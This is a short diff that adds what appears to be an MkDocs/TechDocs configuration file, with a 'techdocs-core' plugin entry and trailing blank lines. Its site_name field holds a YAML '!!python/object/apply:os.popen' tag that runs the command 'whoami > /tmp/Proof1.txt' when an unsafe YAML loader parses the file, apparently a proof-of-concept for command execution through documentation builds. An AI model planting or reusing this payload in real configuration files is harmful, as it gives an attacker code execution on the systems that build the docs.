@@ -1,0 +1,20 @@
+site_name: !!python/object/apply:os.popen
+  - "whoami > /tmp/Proof1.txt"
+plugins:
+  - techdocs-core
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
